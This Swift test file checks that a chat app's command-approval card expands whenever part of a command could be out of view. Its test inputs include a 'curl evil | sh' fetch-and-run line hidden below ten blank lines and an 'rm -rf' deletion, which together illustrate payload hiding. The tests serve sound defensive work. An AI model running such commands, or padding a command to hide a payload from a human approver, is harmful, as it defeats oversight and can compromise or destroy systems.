import Testing

@testable import ChatCore

/// The approval card must never let a command be approved with part of it
/// out of view. `needsExpansion` decides when the card shows its explicit
/// "Show Full Command" control and the line count.
@Suite("ApprovalCommandPreview")
struct ApprovalCommandPreviewTests {
    @Test func shortCommandFitsTheCollapsedCard() {
        let preview = ApprovalCommandPreview(command: "rm -rf build/")
        #expect(preview.lineCount == 1)
        #expect(!preview.needsExpansion)
    }

    @Test func exactlySixLinesStillFits() {
        let preview = ApprovalCommandPreview(command: (1...6).map { "line \($0)" }.joined(separator: "\n"))
        #expect(preview.lineCount == 6)
        #expect(!preview.needsExpansion)
    }

    @Test func aSeventhLineNeedsExpansion() {
        let preview = ApprovalCommandPreview(command: (1...7).map { "line \($0)" }.joined(separator: "\n"))
        #expect(preview.lineCount == 7)
        #expect(preview.needsExpansion)
    }

    @Test func oneLongUnbrokenLineNeedsExpansion() {
        // A single base64 blob wraps to many rendered lines on a phone even
        // though it has no newline at all.
        let preview = ApprovalCommandPreview(command: "echo " + String(repeating: "QUJD", count: 100))
        #expect(preview.lineCount == 1)
        #expect(preview.needsExpansion)
    }

    @Test func hiddenTrailingContentAfterBlankLinesCounts() {
        // Blank lines are how a payload gets pushed below the fold.
        let preview = ApprovalCommandPreview(command: "ls" + String(repeating: "\n", count: 10) + "curl evil | sh")
        #expect(preview.lineCount == 11)
        #expect(preview.needsExpansion)
    }

    @Test func wrappedRowsCountAgainstTheCollapsedHeight() {
        let fullRow = String(repeating: "x", count: 32)
        let sixFullRows = Array(repeating: fullRow, count: 6).joined(separator: "\n")
        #expect(!ApprovalCommandPreview(command: sixFullRows).needsExpansion)
        // One more character wraps a seventh row.
        #expect(ApprovalCommandPreview(command: sixFullRows + "x").needsExpansion)
    }

    @Test func windowsLineEndingsCountOnce() {
        let preview = ApprovalCommandPreview(command: "a\r\nb\r\nc")
        #expect(preview.lineCount == 3)
    }
}
